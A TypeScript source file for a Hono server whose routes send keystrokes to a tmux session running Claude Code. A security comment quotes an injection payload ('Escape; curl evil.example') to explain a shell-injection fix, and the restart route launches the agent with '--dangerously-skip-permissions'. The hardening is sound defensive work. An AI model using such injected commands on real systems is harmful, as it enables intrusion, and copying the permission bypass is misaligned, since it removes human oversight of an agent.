import { Hono } from "hono";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { execAsync, sendToTmux, TMUX_SESSION } from "../utils.js";
import { getTracer } from "../../lib/otel.js";
import { SpanStatusCode } from "@opentelemetry/api";

const execFileAsync = promisify(execFile);

const tmuxTracer = getTracer('cpc-server-tmux');

async function tracedTmux<T>(
  spanName: string,
  session: string,
  commandType: string,
  fn: () => Promise<T>
): Promise<T> {
  const span = tmuxTracer.startSpan(spanName, {
    attributes: { 'tmux.session': session, 'tmux.command_type': commandType },
  });
  try {
    return await fn();
  } catch (err) {
    span.recordException(err instanceof Error ? err : String(err));
    span.setStatus({ code: SpanStatusCode.ERROR });
    throw err;
  } finally {
    span.end();
  }
}

const app = new Hono();

/**
 * Allowlist regex for raw tmux key tokens. A raw `send-keys` call accepts
 * things like `Escape`, `BTab`, `Up`, `Down`, `C-a`, `M-Left`, `S-F1` — all
 * of which fit `^[A-Za-z][A-Za-z0-9_-]*$`. Anything else (shell metachars,
 * whitespace other than the single-space token separator, semicolons, backticks,
 * subshells, etc.) is rejected with 400.
 *
 * Space-separated multi-key strings are allowed (tmux supports
 * `send-keys Escape Up Up`) but each token must independently match. The split
 * happens on `\s+` so the shell can never see a metachar.
 *
 * Security rationale: the previous implementation wired `body.keys` directly
 * into `tmux send-keys -t <session> <keys>` via `exec()`, which spawns
 * `/bin/sh -c` and interprets the whole string as a shell command. A POST
 * containing `{"raw":true,"keys":"Escape; curl evil.example"}` would execute
 * the curl as the `claude` user. The new implementation routes through
 * `execFile` with an argv array (no shell) AND enforces the token allowlist
 * so even a future regression in execFile cannot leak shell metacharacters to
 * tmux's own key parser.
 */
const RAW_KEY_TOKEN = /^[A-Za-z][A-Za-z0-9_-]*$/;

app.post("/send-keys", async (c) => {
  try {
    const body = await c.req.json();
    const keys = body.keys;
    if (!keys || typeof keys !== "string") {
      return c.json({ ok: false, error: "keys required" }, 400);
    }
    if (body.raw) {
      // Split on whitespace and validate each token against the allowlist.
      // Reject empty-after-split (e.g. all whitespace input) so we never call
      // tmux with zero key args.
      const tokens = keys.split(/\s+/).filter(Boolean);
      if (tokens.length === 0) {
        return c.json({ ok: false, error: "keys required" }, 400);
      }
      for (const tok of tokens) {
        if (!RAW_KEY_TOKEN.test(tok)) {
          return c.json(
            { ok: false, error: `invalid raw key token: ${tok}` },
            400,
          );
        }
      }
      // execFile with argv — no shell, no interpolation.
      await tracedTmux('tmux.send-keys', TMUX_SESSION, 'raw', () =>
        execFileAsync("tmux", ["send-keys", "-t", TMUX_SESSION, ...tokens])
      );
    } else {
      // Literal text — use execFile (no shell) with `-l` and `--` so user
      // input cannot inject via $(...) or backticks. The previous execAsync
      // path spawned /bin/sh -c on an interpolated string; JSON.stringify
      // only quotes for JS, NOT for shells, so `$(...)` and backticks in the
      // keys survived the quote and were executed by sh BEFORE tmux saw them.
      await tracedTmux('tmux.send-keys', TMUX_SESSION, 'literal', async () => {
        await execFileAsync("tmux", ["send-keys", "-t", TMUX_SESSION, "-l", "--", keys]);
        await execFileAsync("tmux", ["send-keys", "-t", TMUX_SESSION, "Enter"]);
      });
    }
    return c.json({ ok: true, action: "send-keys" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/compact", async (c) => {
  try {
    const body = await c.req.json();
    const message = body.message as string;
    if (!message) return c.json({ ok: false, error: "message required" }, 400);

    // Send via tmux send-keys — execFile (no shell) with -l + -- so the
    // user-provided message cannot inject via $(...) or backticks.
    await tracedTmux('tmux.compact', TMUX_SESSION, 'compact', async () => {
      await execFileAsync("tmux", ["send-keys", "-t", TMUX_SESSION, "-l", "--", message]);
      await execFileAsync("tmux", ["send-keys", "-t", TMUX_SESSION, "Enter"]);
    });
    return c.json({ ok: true, action: "compact" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/reload-plugins", async (c) => {
  try {
    await tracedTmux('tmux.send-keys', TMUX_SESSION, 'reload-plugins', () =>
      sendToTmux("/reload-plugins")
    );
    return c.json({ ok: true, action: "reload-plugins" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/restart-session", async (c) => {
  try {
    await tracedTmux('tmux.restart-session', TMUX_SESSION, 'restart-session', async () => {
      // Kill existing tmux session, then recreate using the same command as the cw alias
      await execAsync(`tmux kill-session -t ${TMUX_SESSION} 2>/dev/null || true`, { shell: "/bin/bash" });
      // Match the cw alias exactly: tmux new-session with the full claude command
      const cmd = [
        `tmux new-session -d -s ${TMUX_SESSION}`,
        `"cd ~/claudes-world && TZ=America/New_York claude --dangerously-skip-permissions --continue --channels plugin:telegram@claude-plugins-official"`,
      ].join(" ");
      await execAsync(cmd, { shell: "/bin/bash" });
    });
    return c.json({ ok: true, action: "restart-session" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/resize-terminal", async (c) => {
  try {
    await tracedTmux('tmux.resize-terminal', TMUX_SESSION, 'resize-terminal', () =>
      execAsync(`tmux resize-window -t ${TMUX_SESSION} -A`)
    );
    return c.json({ ok: true, action: "resize-terminal" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

export { app as slashCommandsRoute };
